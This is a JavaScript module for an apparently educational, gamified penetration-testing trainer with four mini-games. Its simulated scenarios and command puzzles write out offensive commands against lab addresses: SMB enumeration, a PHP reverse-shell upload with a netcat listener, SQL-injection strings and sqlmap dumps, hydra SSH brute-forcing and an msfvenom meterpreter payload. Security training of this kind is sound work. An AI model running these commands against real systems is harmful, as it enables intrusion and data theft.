// ============================================
// Games Engine - Interactive Mini-Games
// ============================================

import { playCorrect, playWrong, playLevelUp, playClick, playXP } from './sounds.js';
import { getProgress, saveProgress } from './progress.js';

// ==================== PORT SCANNER SPEED RUN ====================
const PORT_DATA = [
  { port: 21, service: 'FTP', hint: 'File transfers' },
  { port: 22, service: 'SSH', hint: 'Secure shell' },
  { port: 23, service: 'Telnet', hint: 'Unencrypted remote access' },
  { port: 25, service: 'SMTP', hint: 'Sending email' },
  { port: 53, service: 'DNS', hint: 'Domain name resolution' },
  { port: 80, service: 'HTTP', hint: 'Web traffic' },
  { port: 110, service: 'POP3', hint: 'Receiving email' },
  { port: 111, service: 'RPCbind', hint: 'Remote procedure calls' },
  { port: 135, service: 'MSRPC', hint: 'Windows RPC' },
  { port: 139, service: 'NetBIOS', hint: 'Windows file sharing' },
  { port: 143, service: 'IMAP', hint: 'Email access protocol' },
  { port: 443, service: 'HTTPS', hint: 'Encrypted web traffic' },
  { port: 445, service: 'SMB', hint: 'Windows file shares' },
  { port: 993, service: 'IMAPS', hint: 'Secure IMAP' },
  { port: 995, service: 'POP3S', hint: 'Secure POP3' },
  { port: 1433, service: 'MSSQL', hint: 'Microsoft SQL Server' },
  { port: 1521, service: 'Oracle', hint: 'Oracle database' },
  { port: 3306, service: 'MySQL', hint: 'MySQL database' },
  { port: 3389, service: 'RDP', hint: 'Remote desktop' },
  { port: 5432, service: 'PostgreSQL', hint: 'Postgres database' },
  { port: 5900, service: 'VNC', hint: 'Remote desktop (VNC)' },
  { port: 6379, service: 'Redis', hint: 'In-memory database' },
  { port: 8080, service: 'HTTP-Alt', hint: 'Alternative web port' },
  { port: 27017, service: 'MongoDB', hint: 'NoSQL database' },
];

function shuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

export function startPortScanner(container) {
  const rounds = 12;
  const ports = shuffle(PORT_DATA).slice(0, rounds);
  let current = 0;
  let score = 0;
  let startTime = Date.now();
  let roundStart = Date.now();
  let totalTime = 0;

  function renderRound() {
    const p = ports[current];
    const wrongOptions = shuffle(PORT_DATA.filter(x => x.port !== p.port)).slice(0, 3);
    const options = shuffle([p, ...wrongOptions]);

    container.innerHTML = `
      <div class="game-header">
        <div class="game-title">Port Scanner Speed Run</div>
        <div class="game-stats">
          <span class="game-score">Score: ${score}/${current}</span>
          <span class="game-round">Round ${current + 1}/${rounds}</span>
        </div>
      </div>
      <div class="game-timer-bar"><div class="game-timer-fill" id="game-timer-fill"></div></div>
      <div class="port-challenge">
        <div class="port-big">${p.port}</div>
        <div class="port-hint">${p.hint}</div>
      </div>
      <div class="game-options" id="game-options">
        ${options.map((o, i) => `
          <button class="game-option" data-service="${o.service}">${o.service}</button>
        `).join('')}
      </div>
    `;

    roundStart = Date.now();
    startTimer();

    container.querySelectorAll('.game-option').forEach(btn => {
      btn.addEventListener('click', () => {
        const elapsed = (Date.now() - roundStart) / 1000;
        totalTime += elapsed;
        const correct = btn.dataset.service === p.service;

        if (correct) {
          score++;
          btn.classList.add('game-option-correct');
          playCorrect();
        } else {
          btn.classList.add('game-option-wrong');
          container.querySelector(`[data-service="${p.service}"]`).classList.add('game-option-correct');
          playWrong();
        }

        // Disable all buttons
        container.querySelectorAll('.game-option').forEach(b => b.disabled = true);

        setTimeout(() => {
          current++;
          if (current < rounds) {
            renderRound();
          } else {
            showPortResults();
          }
        }, 800);
      });
    });
  }

  function startTimer() {
    const fill = document.getElementById('game-timer-fill');
    if (fill) {
      fill.style.transition = 'none';
      fill.style.width = '100%';
      requestAnimationFrame(() => {
        fill.style.transition = 'width 10s linear';
        fill.style.width = '0%';
      });
    }
  }

  function showPortResults() {
    const avgTime = (totalTime / rounds).toFixed(1);
    const pct = Math.round((score / rounds) * 100);
    const xpEarned = score * 5;

    const progress = getProgress();
    progress.xp = (progress.xp || 0) + xpEarned;
    if (!progress.gameScores) progress.gameScores = {};
    const prev = progress.gameScores.portScanner || 0;
    if (pct > prev) progress.gameScores.portScanner = pct;
    saveProgress(progress);

    if (score === rounds) playLevelUp();
    else if (score >= rounds * 0.7) playCorrect();

    container.innerHTML = `
      <div class="game-results">
        <div class="game-results-icon">${score === rounds ? '🏆' : score >= rounds * 0.7 ? '🎯' : '💀'}</div>
        <div class="game-results-title">${score === rounds ? 'PERFECT SCAN!' : score >= rounds * 0.7 ? 'Good Scan' : 'Keep Practicing'}</div>
        <div class="game-results-score">${score}/${rounds} correct</div>
        <div class="game-results-detail">Avg time: ${avgTime}s per port</div>
        <div class="game-results-xp">+${xpEarned} XP</div>
        <div class="game-results-actions">
          <button class="btn-primary" onclick="window._startPortScanner()">Play Again</button>
          <button class="btn-secondary" onclick="window.location.hash='#/'">Back to Map</button>
        </div>
      </div>
    `;
  }

  window._startPortScanner = () => startPortScanner(container);
  renderRound();
}

// ==================== HACK THE BOX SIMULATOR ====================
const CTF_SCENARIOS = [
  {
    name: 'EasyBox',
    difficulty: 'Easy',
    ip: '10.10.10.40',
    steps: [
      { prompt: 'First, scan the target for open ports:', validAnswers: ['nmap 10.10.10.40', 'nmap -sV 10.10.10.40', 'nmap -sC -sV 10.10.10.40', 'nmap -A 10.10.10.40'], output: 'PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2\n80/tcp open  http    Apache 2.4.18\n445/tcp open microsoft-ds Windows SMB', hint: 'nmap <ip>' },
      { prompt: 'Port 445 is open. Enumerate SMB shares:', validAnswers: ['smbclient -L 10.10.10.40', 'smbclient -L //10.10.10.40', 'enum4linux 10.10.10.40', 'smbmap -H 10.10.10.40'], output: 'Sharename    Type    Comment\n---------    ----    -------\nBackups      Disk    Company Backups\nUsers        Disk    \nIPC$         IPC     Remote IPC', hint: 'smbclient -L <ip> or enum4linux' },
      { prompt: 'You found a "Backups" share. Connect to it:', validAnswers: ['smbclient //10.10.10.40/Backups', 'smbclient \\\\10.10.10.40\\Backups', 'smbclient //10.10.10.40/Backups -N'], output: 'smb: \\> ls\n  .          D  0  Tue Jan 15 14:30:00 2024\n  ..         D  0  Tue Jan 15 14:30:00 2024\n  config.xml F  1024\n  creds.bak  F  256', hint: 'smbclient //<ip>/Backups' },
      { prompt: 'There\'s a creds.bak file! Download it. What SMB command do you use?', validAnswers: ['get creds.bak', 'mget creds.bak'], output: 'getting file \\creds.bak as creds.bak (1.2 kb/s)\nContents: admin:P@ssw0rd123!', hint: 'get <filename>' },
      { prompt: 'You have SSH creds admin:P@ssw0rd123! — Log in:', validAnswers: ['ssh admin@10.10.10.40', 'ssh -l admin 10.10.10.40'], output: 'admin@easybox:~$ whoami\nadmin\nadmin@easybox:~$ cat /root/flag.txt\nFLAG{sm8_enum_ftw_42}', hint: 'ssh user@<ip>' },
    ]
  },
  {
    name: 'WebShell',
    difficulty: 'Medium',
    ip: '10.10.10.55',
    steps: [
      { prompt: 'Scan the target:', validAnswers: ['nmap 10.10.10.55', 'nmap -sV 10.10.10.55', 'nmap -sC -sV 10.10.10.55', 'nmap -A 10.10.10.55'], output: 'PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1\n80/tcp open  http    nginx 1.18.0\n8080/tcp open http   Apache Tomcat 9.0', hint: 'nmap <ip>' },
      { prompt: 'Port 80 has a website. Brute force directories:', validAnswers: ['dirb http://10.10.10.55', 'gobuster dir -u http://10.10.10.55 -w /usr/share/wordlists/dirb/common.txt', 'dirbuster', 'ffuf -u http://10.10.10.55/FUZZ -w /usr/share/wordlists/dirb/common.txt'], output: '---- Scanning URL: http://10.10.10.55/ ----\n+ /admin (CODE:302 -> /login)\n+ /uploads (CODE:200)\n+ /robots.txt (CODE:200)\n+ /backup (CODE:403)', hint: 'dirb http://<ip> or gobuster' },
      { prompt: 'There\'s an /uploads directory. Check if PUT is allowed:', validAnswers: ['curl -X OPTIONS http://10.10.10.55/uploads -i', 'curl -X OPTIONS http://10.10.10.55/uploads', 'curl -i -X OPTIONS http://10.10.10.55/uploads'], output: 'HTTP/1.1 200 OK\nAllow: GET, POST, PUT, DELETE, OPTIONS\nServer: nginx/1.18.0', hint: 'curl -X OPTIONS http://<ip>/uploads' },
      { prompt: 'PUT is enabled! Upload a PHP reverse shell:', validAnswers: ['curl -X PUT http://10.10.10.55/uploads/shell.php -d @shell.php', 'curl -T shell.php http://10.10.10.55/uploads/shell.php', 'curl -X PUT http://10.10.10.55/uploads/shell.php --data-binary @shell.php'], output: 'HTTP/1.1 201 Created\nFile uploaded successfully.', hint: 'curl -T shell.php http://<ip>/uploads/shell.php' },
      { prompt: 'Shell uploaded! Start a netcat listener to catch the reverse shell:', validAnswers: ['nc -lvnp 4444', 'nc -nlvp 4444', 'ncat -lvnp 4444'], output: 'listening on [any] 4444 ...\nconnect to [10.10.14.2] from 10.10.10.55\n$ whoami\nwww-data\n$ cat /var/www/flag.txt\nFLAG{put_upload_rce_77}', hint: 'nc -lvnp 4444' },
    ]
  },
  {
    name: 'SQLi Lab',
    difficulty: 'Medium',
    ip: '10.10.10.70',
    steps: [
      { prompt: 'Scan the target:', validAnswers: ['nmap 10.10.10.70', 'nmap -sV 10.10.10.70', 'nmap -sC -sV 10.10.10.70'], output: 'PORT   STATE SERVICE VERSION\n80/tcp open  http    Apache 2.4.41\n3306/tcp open mysql  MySQL 5.7.33', hint: 'nmap <ip>' },
      { prompt: 'There\'s a login page at /login. Test for SQL injection in the username field:', validAnswers: ["' OR 1=1 --", "admin' OR '1'='1", "' OR 1=1#", "admin'--"], output: 'Login successful!\nWelcome, admin!\nRedirecting to /dashboard...', hint: "Try ' OR 1=1 --" },
      { prompt: 'You\'re in! Now use sqlmap to dump the database:', validAnswers: ['sqlmap -u http://10.10.10.70/login --data "user=admin&pass=test" --dbs', 'sqlmap -u "http://10.10.10.70/login" --forms --dbs', "sqlmap -u http://10.10.10.70/login --data 'user=admin&pass=test' --dbs"], output: 'available databases [3]:\n[*] information_schema\n[*] mysql\n[*] webapp_db', hint: 'sqlmap -u <url> --data "user=admin&pass=test" --dbs' },
      { prompt: 'Dump the webapp_db tables:', validAnswers: ['sqlmap -u http://10.10.10.70/login --data "user=admin&pass=test" -D webapp_db --tables', "sqlmap -u http://10.10.10.70/login --data 'user=admin&pass=test' -D webapp_db --tables"], output: 'Database: webapp_db\n[3 tables]\n+-----------+\n| users     |\n| sessions  |\n| secrets   |\n+-----------+', hint: 'sqlmap ... -D webapp_db --tables' },
      { prompt: 'Dump the secrets table:', validAnswers: ['sqlmap -u http://10.10.10.70/login --data "user=admin&pass=test" -D webapp_db -T secrets --dump', "sqlmap -u http://10.10.10.70/login --data 'user=admin&pass=test' -D webapp_db -T secrets --dump"], output: '+----+----------------------------+\n| id | flag                       |\n+----+----------------------------+\n| 1  | FLAG{sql1_dump_s3crets_99} |\n+----+----------------------------+', hint: 'sqlmap ... -D webapp_db -T secrets --dump' },
    ]
  }
];

export function startHackTheBox(container, scenarioIndex = null) {
  const scenario = scenarioIndex !== null ? CTF_SCENARIOS[scenarioIndex] : CTF_SCENARIOS[Math.floor(Math.random() * CTF_SCENARIOS.length)];
  let step = 0;
  let hintsUsed = 0;

  function renderStep() {
    const s = scenario.steps[step];
    container.innerHTML = `
      <div class="game-header">
        <div class="game-title">Hack The Box: ${scenario.name}</div>
        <div class="game-stats">
          <span class="game-difficulty diff-${scenario.difficulty.toLowerCase()}">${scenario.difficulty}</span>
          <span class="game-round">Step ${step + 1}/${scenario.steps.length}</span>
        </div>
      </div>
      <div class="game-timer-bar"><div class="game-timer-fill" style="width:${((step + 1) / scenario.steps.length) * 100}%; background: var(--accent-green); transition: width 0.3s;"></div></div>
      <div class="htb-target">
        <span class="htb-ip">Target: ${scenario.ip}</span>
      </div>
      ${step > 0 ? `<div class="htb-prev-output"><pre>${scenario.steps[step - 1].output}</pre></div>` : ''}
      <div class="htb-prompt">${s.prompt}</div>
      <div class="htb-input-wrap">
        <span class="htb-prompt-symbol">$ </span>
        <input type="text" class="htb-input" id="htb-input" autocomplete="off" spellcheck="false" placeholder="Type your command...">
      </div>
      <div class="htb-actions">
        <button class="btn-primary" id="htb-submit">Execute</button>
        <button class="btn-secondary" id="htb-hint">Hint (-5 XP)</button>
      </div>
      <div id="htb-feedback"></div>
    `;

    const input = document.getElementById('htb-input');
    const submitBtn = document.getElementById('htb-submit');
    const hintBtn = document.getElementById('htb-hint');
    const feedback = document.getElementById('htb-feedback');

    input.focus();

    const checkAnswer = () => {
      const answer = input.value.trim();
      if (!answer) return;

      const isCorrect = s.validAnswers.some(v => {
        const norm = a => a.toLowerCase().replace(/\s+/g, ' ').trim();
        return norm(answer) === norm(v) || norm(answer).includes(norm(v)) || norm(v).includes(norm(answer));
      });

      if (isCorrect) {
        playCorrect();
        feedback.innerHTML = `<div class="htb-output"><pre>${s.output}</pre></div>`;
        input.disabled = true;
        submitBtn.disabled = true;
        input.classList.add('htb-input-correct');

        setTimeout(() => {
          step++;
          if (step < scenario.steps.length) {
            renderStep();
          } else {
            showHTBResults();
          }
        }, 1500);
      } else {
        playWrong();
        input.classList.add('htb-input-wrong');
        feedback.innerHTML = `<div class="htb-wrong">Not quite. Try again or use a hint.</div>`;
        setTimeout(() => input.classList.remove('htb-input-wrong'), 400);
      }
    };

    submitBtn.addEventListener('click', checkAnswer);
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') checkAnswer();
    });

    hintBtn.addEventListener('click', () => {
      hintsUsed++;
      feedback.innerHTML = `<div class="htb-hint-text">Hint: <code>${s.hint}</code></div>`;
      playClick();
    });
  }

  function showHTBResults() {
    const xpEarned = Math.max(10, (scenario.steps.length * 15) - (hintsUsed * 5));
    const progress = getProgress();
    progress.xp = (progress.xp || 0) + xpEarned;
    if (!progress.gameScores) progress.gameScores = {};
    progress.gameScores[`htb_${scenario.name}`] = true;
    saveProgress(progress);

    playLevelUp();

    container.innerHTML = `
      <div class="game-results">
        <div class="game-results-icon">🏴</div>
        <div class="game-results-title">BOX PWNED!</div>
        <div class="game-results-score">${scenario.name} (${scenario.difficulty})</div>
        <div class="game-results-detail">Hints used: ${hintsUsed}</div>
        <div class="game-results-xp">+${xpEarned} XP</div>
        <div class="game-results-actions">
          <button class="btn-primary" onclick="window._startHTB()">Next Box</button>
          <button class="btn-secondary" onclick="window.location.hash='#/'">Back to Map</button>
        </div>
      </div>
    `;
  }

  window._startHTB = () => startHackTheBox(container);
  renderStep();
}

// ==================== COMMAND BUILDER ====================
const CMD_CHALLENGES = [
  { goal: 'Scan all ports with service detection on 10.10.10.1', fragments: ['nmap', '-p-', '-sV', '10.10.10.1', '-sC', '--open'], answer: ['nmap', '-p-', '-sV', '10.10.10.1'], required: ['nmap', '-sV', '10.10.10.1'] },
  { goal: 'Brute force SSH login on 10.10.10.5 with user admin', fragments: ['hydra', '-l', 'admin', '-P', 'rockyou.txt', 'ssh://10.10.10.5', '-t', '4', 'ftp://'], answer: ['hydra', '-l', 'admin', '-P', 'rockyou.txt', 'ssh://10.10.10.5'], required: ['hydra', '-l', 'admin', '-P', 'ssh://10.10.10.5'] },
  { goal: 'Generate a reverse shell payload for Windows with msfvenom', fragments: ['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', 'LHOST=10.10.14.1', 'LPORT=4444', '-f', 'exe', '-o', 'shell.exe', 'linux/x86/shell_reverse_tcp'], answer: ['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', 'LHOST=10.10.14.1', 'LPORT=4444', '-f', 'exe'], required: ['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', '-f', 'exe'] },
  { goal: 'Use curl to send a POST request with login data to http://target.com/login', fragments: ['curl', '-X', 'POST', '-d', '"user=admin&pass=test"', 'http://target.com/login', '-i', '-X GET', 'http://other.com'], answer: ['curl', '-X', 'POST', '-d', '"user=admin&pass=test"', 'http://target.com/login'], required: ['curl', 'POST', 'http://target.com/login'] },
  { goal: 'List SMB shares on 10.10.10.20 with no password', fragments: ['smbclient', '-L', '//10.10.10.20', '-N', '10.10.10.20', '-U admin', 'smbmap'], answer: ['smbclient', '-L', '//10.10.10.20', '-N'], required: ['smbclient', '-L', '-N'] },
  { goal: 'Start a Netcat listener on port 9001', fragments: ['nc', '-l', '-v', '-n', '-p', '9001', '4444', 'connect', '-e /bin/bash'], answer: ['nc', '-lvnp', '9001'], required: ['nc', '9001'] },
];

export function startCommandBuilder(container) {
  const challenges = shuffle(CMD_CHALLENGES).slice(0, 5);
  let current = 0;
  let score = 0;
  let selected = [];

  function renderChallenge() {
    const ch = challenges[current];
    const frags = shuffle(ch.fragments);
    selected = [];

    container.innerHTML = `
      <div class="game-header">
        <div class="game-title">Command Builder</div>
        <div class="game-stats">
          <span class="game-score">Score: ${score}/${current}</span>
          <span class="game-round">${current + 1}/${challenges.length}</span>
        </div>
      </div>
      <div class="game-timer-bar"><div class="game-timer-fill" style="width:${((current + 1) / challenges.length) * 100}%; background: var(--accent-cyan); transition: width 0.3s;"></div></div>
      <div class="cmd-goal">
        <div class="cmd-goal-label">MISSION:</div>
        <div class="cmd-goal-text">${ch.goal}</div>
      </div>
      <div class="cmd-build-area" id="cmd-build-area">
        <span class="cmd-prompt">$ </span>
        <span id="cmd-built" class="cmd-built"></span>
        <span class="cmd-cursor">|</span>
      </div>
      <div class="cmd-fragments" id="cmd-fragments">
        ${frags.map((f, i) => `<button class="cmd-frag" data-frag="${f}" data-idx="${i}">${f}</button>`).join('')}
      </div>
      <div class="cmd-actions">
        <button class="btn-secondary" id="cmd-clear">Clear</button>
        <button class="btn-primary" id="cmd-submit">Execute</button>
      </div>
      <div id="cmd-feedback"></div>
    `;

    container.querySelectorAll('.cmd-frag').forEach(btn => {
      btn.addEventListener('click', () => {
        if (btn.classList.contains('cmd-frag-used')) {
          // Remove from selection
          selected = selected.filter(s => s !== btn.dataset.frag + '_' + btn.dataset.idx);
          btn.classList.remove('cmd-frag-used');
        } else {
          selected.push(btn.dataset.frag + '_' + btn.dataset.idx);
          btn.classList.add('cmd-frag-used');
        }
        playClick();
        updateBuilt();
      });
    });

    document.getElementById('cmd-clear').addEventListener('click', () => {
      selected = [];
      container.querySelectorAll('.cmd-frag').forEach(b => b.classList.remove('cmd-frag-used'));
      updateBuilt();
    });

    document.getElementById('cmd-submit').addEventListener('click', checkCommand);
  }

  function updateBuilt() {
    const built = document.getElementById('cmd-built');
    const parts = selected.map(s => s.split('_')[0]);
    built.textContent = parts.join(' ');
  }

  function checkCommand() {
    const ch = challenges[current];
    const parts = selected.map(s => s.split('_')[0]);
    const builtCmd = parts.join(' ').toLowerCase();

    // Check if all required fragments are present
    const hasRequired = ch.required.every(req =>
      parts.some(p => p.toLowerCase().includes(req.toLowerCase()))
    );

    const feedback = document.getElementById('cmd-feedback');

    if (hasRequired) {
      score++;
      playCorrect();
      feedback.innerHTML = `<div class="cmd-correct">Correct! Command accepted.</div>`;
    } else {
      playWrong();
      feedback.innerHTML = `<div class="cmd-wrong">Not quite. Expected: <code>${ch.answer.join(' ')}</code></div>`;
    }

    setTimeout(() => {
      current++;
      if (current < challenges.length) {
        renderChallenge();
      } else {
        showCmdResults();
      }
    }, 1200);
  }

  function showCmdResults() {
    const xpEarned = score * 8;
    const progress = getProgress();
    progress.xp = (progress.xp || 0) + xpEarned;
    saveProgress(progress);

    if (score === challenges.length) playLevelUp();

    container.innerHTML = `
      <div class="game-results">
        <div class="game-results-icon">${score === challenges.length ? '🏆' : score >= 3 ? '⚡' : '🔧'}</div>
        <div class="game-results-title">${score === challenges.length ? 'MASTER BUILDER!' : score >= 3 ? 'Good Work' : 'Keep Practicing'}</div>
        <div class="game-results-score">${score}/${challenges.length} commands built</div>
        <div class="game-results-xp">+${xpEarned} XP</div>
        <div class="game-results-actions">
          <button class="btn-primary" onclick="window._startCmdBuilder()">Play Again</button>
          <button class="btn-secondary" onclick="window.location.hash='#/'">Back to Map</button>
        </div>
      </div>
    `;
  }

  window._startCmdBuilder = () => startCommandBuilder(container);
  renderChallenge();
}

// ==================== FLASHCARD BLITZ ====================
const FLASHCARDS = [
  { q: 'What port does SSH run on?', a: '22' },
  { q: 'What does OSINT stand for?', a: 'Open Source Intelligence' },
  { q: 'What tool is used for SQL injection automation?', a: 'sqlmap' },
  { q: 'What does CVE stand for?', a: 'Common Vulnerabilities and Exposures' },
  { q: 'What Nmap flag enables service version detection?', a: '-sV' },
  { q: 'What port does RDP use?', a: '3389' },
  { q: 'What attack intercepts communication between two parties?', a: 'Man-in-the-Middle (MITM)' },
  { q: 'What does XSS stand for?', a: 'Cross-Site Scripting' },
  { q: 'What port does SMB use?', a: '445' },
  { q: 'What tool in Kali clones websites for credential harvesting?', a: 'SET (Social Engineering Toolkit)' },
  { q: 'What HTTP status code means "Forbidden"?', a: '403' },
  { q: 'What Metasploit module type is used for exploitation?', a: 'exploit' },
  { q: 'What does LFI stand for?', a: 'Local File Inclusion' },
  { q: 'What protocol resolves domain names to IP addresses?', a: 'DNS' },
  { q: 'What CIA triad element ensures data isn\'t modified?', a: 'Integrity' },
  { q: 'What port does MySQL use?', a: '3306' },
  { q: 'What type of shell connects back to the attacker?', a: 'Reverse shell' },
  { q: 'What does CSRF stand for?', a: 'Cross-Site Request Forgery' },
  { q: 'What Nmap flag runs default scripts?', a: '-sC' },
  { q: 'What cookie flag prevents JavaScript access?', a: 'HttpOnly' },
  { q: 'What port does DNS use?', a: '53' },
  { q: 'What tool is used for password cracking with wordlists?', a: 'John the Ripper / Hashcat' },
  { q: 'What Metasploit command searches for modules?', a: 'search' },
  { q: 'What Linux command shows network connections?', a: 'netstat / ss' },
  { q: 'What does ARP stand for?', a: 'Address Resolution Protocol' },
];

export function startFlashcards(container) {
  const cards = shuffle(FLASHCARDS).slice(0, 15);
  let current = 0;
  let known = 0;
  let startTime = Date.now();

  function renderCard() {
    const card = cards[current];
    container.innerHTML = `
      <div class="game-header">
        <div class="game-title">Flashcard Blitz</div>
        <div class="game-stats">
          <span class="game-score">Known: ${known}/${current}</span>
          <span class="game-round">${current + 1}/${cards.length}</span>
        </div>
      </div>
      <div class="game-timer-bar"><div class="game-timer-fill" style="width:${((current + 1) / cards.length) * 100}%; background: var(--accent-purple); transition: width 0.3s;"></div></div>
      <div class="flash-card" id="flash-card">
        <div class="flash-front">
          <div class="flash-q">${card.q}</div>
          <div class="flash-tap">Click to reveal answer</div>
        </div>
        <div class="flash-back hidden">
          <div class="flash-a">${card.a}</div>
          <div class="flash-buttons">
            <button class="flash-btn flash-btn-no" id="flash-no">Didn't Know</button>
            <button class="flash-btn flash-btn-yes" id="flash-yes">Knew It!</button>
          </div>
        </div>
      </div>
    `;

    const flashCard = document.getElementById('flash-card');
    const front = flashCard.querySelector('.flash-front');
    const back = flashCard.querySelector('.flash-back');

    front.addEventListener('click', () => {
      front.classList.add('hidden');
      back.classList.remove('hidden');
      flashCard.classList.add('flash-flipped');
      playClick();
    });

    document.getElementById('flash-yes').addEventListener('click', () => {
      known++;
      playCorrect();
      nextCard();
    });

    document.getElementById('flash-no').addEventListener('click', () => {
      playWrong();
      nextCard();
    });
  }

  function nextCard() {
    current++;
    if (current < cards.length) {
      renderCard();
    } else {
      showFlashResults();
    }
  }

  function showFlashResults() {
    const elapsed = Math.round((Date.now() - startTime) / 1000);
    const xpEarned = known * 3;
    const progress = getProgress();
    progress.xp = (progress.xp || 0) + xpEarned;
    saveProgress(progress);

    container.innerHTML = `
      <div class="game-results">
        <div class="game-results-icon">${known >= cards.length * 0.8 ? '🧠' : known >= cards.length * 0.5 ? '📚' : '🔄'}</div>
        <div class="game-results-title">${known >= cards.length * 0.8 ? 'BIG BRAIN!' : known >= cards.length * 0.5 ? 'Getting There' : 'Review Time'}</div>
        <div class="game-results-score">${known}/${cards.length} cards known</div>
        <div class="game-results-detail">Completed in ${elapsed}s</div>
        <div class="game-results-xp">+${xpEarned} XP</div>
        <div class="game-results-actions">
          <button class="btn-primary" onclick="window._startFlashcards()">Play Again</button>
          <button class="btn-secondary" onclick="window.location.hash='#/'">Back to Map</button>
        </div>
      </div>
    `;
  }

  window._startFlashcards = () => startFlashcards(container);
  renderCard();
}

// ==================== GAMES MENU (for welcome page) ====================
export function renderGamesSection() {
  return `
    <div class="games-section">
      <h3 class="games-title">Training Games</h3>
      <div class="games-grid">
        <a class="game-card" href="#/game-ports">
          <div class="game-card-icon">🎯</div>
          <div class="game-card-name">Port Scanner</div>
          <div class="game-card-desc">Match ports to services — speed run!</div>
        </a>
        <a class="game-card" href="#/game-htb">
          <div class="game-card-icon">🏴</div>
          <div class="game-card-name">Hack The Box</div>
          <div class="game-card-desc">Simulate hacking a target machine</div>
        </a>
        <a class="game-card" href="#/game-cmdbuild">
          <div class="game-card-icon">⚡</div>
          <div class="game-card-name">Command Builder</div>
          <div class="game-card-desc">Build the right command from fragments</div>
        </a>
        <a class="game-card" href="#/game-flash">
          <div class="game-card-icon">🧠</div>
          <div class="game-card-name">Flashcard Blitz</div>
          <div class="game-card-desc">Test your knowledge — rapid fire</div>
        </a>
      </div>
    </div>
  `;
}
